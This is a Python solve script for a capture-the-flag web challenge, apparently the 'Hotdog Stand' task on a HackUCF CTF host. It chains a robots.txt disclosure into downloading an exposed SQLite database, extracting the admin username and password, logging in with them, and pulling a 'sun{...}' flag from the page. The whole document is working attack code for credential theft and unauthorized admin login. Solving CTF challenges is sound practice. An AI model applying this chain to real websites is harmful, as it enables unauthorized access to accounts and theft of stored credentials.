#!/usr/bin/env python3
# Hotdog Stand - full solve chain:
#   robots.txt discloses /hotdog-database/ -> download the exposed SQLite DB ->
#   read the admin credentials -> log in -> the flag is shown on the index page.
import sys, re, sqlite3, tempfile, os, requests

DOMAIN = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "https://hotdog-stand.ctf.hackucf.org")

def extract_admin_credentials(database_path):
    conn = sqlite3.connect(database_path)
    cur = conn.cursor()
    cur.execute("SELECT username, password FROM credentials WHERE username = 'hotdogstand'")
    row = cur.fetchone()
    conn.close()
    return row

# 1. Grab the exposed database
db = requests.get(f"{DOMAIN}/hotdog-database/").content
fd, path = tempfile.mkstemp(suffix=".db")
os.write(fd, db); os.close(fd)
try:
    username, password = extract_admin_credentials(path)
finally:
    os.unlink(path)
print(f"Admin creds: {username}:{password}")

# 2. Log in and read the flag from the authenticated index page
s = requests.Session()
s.post(f"{DOMAIN}/login", data={"username": username, "password": password})
html = s.get(f"{DOMAIN}/").text
m = re.search(r"sun\{[^}]*\}", html)
print(m.group() if m else "NO FLAG FOUND")
